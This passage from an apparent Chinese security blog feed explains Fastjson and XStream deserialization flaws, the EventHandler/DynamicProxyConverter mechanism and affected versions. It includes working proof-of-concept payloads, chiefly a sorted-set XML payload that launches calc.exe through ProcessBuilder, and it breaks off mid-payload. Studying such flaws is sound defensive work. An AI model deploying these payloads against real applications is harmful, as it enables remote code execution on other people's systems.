class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"@type"</span>:<span class="string">"xxx.xxx.xxx"</span>,</span><br><span class="line"><span class="attr">"xxx"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p><ol><li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li><li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li></ol><h3 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h3><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FJTest2.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹计算器：</p><p><img src="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/1.png" alt=""></p><p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><hr><p>OK，Fastjson反序列化漏洞的一些基本概念原理就写到这了，下一篇写2017年的Fastjson 1.2.22-1.2.24 反序列化漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java XStream反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/10/21/XStream反序列化漏洞/</id>
    <published>2019-10-21T15:19:07.000Z</published>
    <updated>2019-11-03T10:25:21.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="XStream简介"><a href="#XStream简介" class="headerlink" title="XStream简介"></a>XStream简介</h3><p>XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。</p><h3 id="使用XStream实现序列化与反序列化"><a href="#使用XStream实现序列化与反序列化" class="headerlink" title="使用XStream实现序列化与反序列化"></a>使用XStream实现序列化与反序列化</h3><p>下面看下如何使用XStream进行序列化和反序列化操作的。</p><p>先定义IPerson.java接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着定义Person类实现前面的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">output</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"Hello, this is "</span> + <span class="keyword">this</span>.name + <span class="string">", age "</span> + <span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XStream序列化是调用XStream.toXML()来实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        String xml = xstream.toXML(p);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>6<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将输出结果保存为person.xml文件。</p><p>XStream反序列化是用过调用XStream.fromXML()来实现的，其中获取XML文件内容的方式可以通过Scanner()或FileInputStream都可以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("person.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"person.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, this is mi1k7ea, age 6</span><br></pre></td></tr></table></figure><h3 id="Java动态代理机制"><a href="#Java动态代理机制" class="headerlink" title="Java动态代理机制"></a>Java动态代理机制</h3><p>在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。</p><p>通过动态代理机制，可以为某一个对象动态生成一个代理对象来替代对原对象的访问，可以有效地控制对原对象的访问并且能够很好地隐藏和保护原对象，此外还能在原对象函数的基础上添加一些额外的操作，如打印日志等。</p><p>具体的可参考：<a href="https://www.mi1k7ea.com/2019/02/01/Java动态代理机制/">Java动态代理机制</a></p><h3 id="EventHandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h3><p>EventHandler类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p><p>EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接。</p><p>EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String action;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">                Method targetMethod = Statement.getMethod(</span><br><span class="line">                             target.getClass(), action, argTypes);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点看下EventHandler.invokeInternal()函数的代码逻辑，如注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line"><span class="comment">//-------------------------------------part1----------------------------------</span></span><br><span class="line"><span class="comment">//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称</span></span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        <span class="keyword">if</span> (var2.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Integer(System.identityHashCode(var1));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1 == var3[<span class="number">0</span>] ? Boolean.TRUE : Boolean.FALSE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.getClass().getName() + <span class="string">'@'</span> + Integer.toHexString(var1.hashCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//-------------------------------------part2----------------------------------</span></span><br><span class="line"><span class="comment">//貌似获取了一个class和object</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.listenerMethodName != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.listenerMethodName.equals(var4)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class[] var5 = <span class="keyword">null</span>;</span><br><span class="line">            Object[] var6 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.eventPropertyName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object var7 = <span class="keyword">this</span>.applyGetters(var3[<span class="number">0</span>], <span class="keyword">this</span>.getEventPropertyName());</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[]&#123;var7&#125;;</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[]&#123;var7 == <span class="keyword">null</span> ? <span class="keyword">null</span> : var7.getClass()&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> var12 = <span class="keyword">this</span>.action.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">                <span class="keyword">if</span> (var12 != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.target = <span class="keyword">this</span>.applyGetters(<span class="keyword">this</span>.target, <span class="keyword">this</span>.action.substring(<span class="number">0</span>, var12));</span><br><span class="line">                    <span class="keyword">this</span>.action = <span class="keyword">this</span>.action.substring(var12 + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//--------------------------------------part3----------------------------------------</span></span><br><span class="line"><span class="comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException</span></span><br><span class="line">                Method var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="keyword">this</span>.action, var5);</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//判断var13是否为空,当然不为空啦</span></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="string">"set"</span> + NameGenerator.capitalize(<span class="keyword">this</span>.action), var5);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    String var9 = var5.length == <span class="number">0</span> ? <span class="string">" with no arguments"</span> : <span class="string">" with argument "</span> + var5[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"No method called "</span> + <span class="keyword">this</span>.action + <span class="string">" on "</span> + <span class="keyword">this</span>.target.getClass() + var9);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//-------------------------------------part4----------------------------------</span></span><br><span class="line"><span class="comment">//调用invoke,调用函数,执行命令</span></span><br><span class="line">                    <span class="keyword">return</span> MethodUtil.invoke(var13, <span class="keyword">this</span>.target, var6);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var10) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                Throwable var8 = var11.getTargetException();</span><br><span class="line">                <span class="keyword">throw</span> var8 <span class="keyword">instanceof</span> RuntimeException ? (RuntimeException)var8 : <span class="keyword">new</span> RuntimeException(var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h3><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>具体参考：<a href="http://x-stream.github.io/converters.html" target="_blank" rel="noopener">http://x-stream.github.io/converters.html</a></p><p><strong>DynamicProxyConverter</strong></p><p>DynamicProxyConverter即动态代理转换器，是XStream支持的一种转换器，其存在使得XStream能够把XML内容反序列化转换为动态代理类对象：</p><p><img src="/2019/10/21/XStream反序列化漏洞/23.png" alt=""></p><p>XStream反序列化漏洞的PoC都是以DynamicProxyConverter这个转换器为基础来编写的。</p><p>以官网给的例子为例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Blah<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Woo<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"com.foo.MyHandler"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">something</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</p><h2 id="0x02-XStream反序列化漏洞"><a href="#0x02-XStream反序列化漏洞" class="headerlink" title="0x02 XStream反序列化漏洞"></a>0x02 XStream反序列化漏洞</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>在1.4.x系列版本中，&lt;=1.4.6或=1.4.10是存在反序列化漏洞的。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，这便与原生的Java序列化和反序列化机制有所区别，因此两者的反序列化漏洞也是有着很大区别的。</p><p>XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h3 id="几种PoC浅析"><a href="#几种PoC浅析" class="headerlink" title="几种PoC浅析"></a>几种PoC浅析</h3><h4 id="基于sorted-set的PoC"><a href="#基于sorted-set的PoC" class="headerlink" title="基于sorted-set的PoC"></a>基于sorted-set的PoC</h4><h5 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h5><p>1.4.5，1.4.6，1.4.10</p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>复现用的XStream版本是1.4.6。</p><p>payload1.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/2.png" alt=""></p><p>如果想加入多条命令，如创建目录等，可改为如下的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 